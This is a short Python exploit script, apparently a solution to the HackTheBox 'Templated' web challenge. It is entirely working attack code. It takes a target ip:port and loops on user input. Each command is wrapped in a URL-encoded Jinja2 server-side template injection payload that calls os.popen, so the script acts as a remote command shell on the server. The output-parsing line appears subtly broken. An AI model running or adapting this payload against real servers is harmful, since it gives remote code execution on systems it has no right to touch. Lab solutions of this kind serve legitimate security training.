#!/bin/python3
# Templated HTB | Web | easy 
# author : Hussien Misbah
# date : 14 Jan 2022 
# waiting for ip:port as argument , spawn a shell and waiting for a command 
import sys 
import requests
from bs4 import BeautifulSoup


if len(sys.argv)-1 != 1 :
	print("usage : python3 exploit.py <ip:port>")
	sys.exit(-1)

url = f"http://{sys.argv[1]}/"
try :
	r = requests.get(url)
except :
	print('[!] make sure the host is up')
	sys.exit(-1)
while 1 :
	command = input("#")
	injection = f"/%7B%7B%20self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{command}').read()%20%7D%7D"
	send =url + injection
	r = requests.get(send)
	soup =BeautifulSoup(r.text, 'html.parser')
	print(soup.str.text)
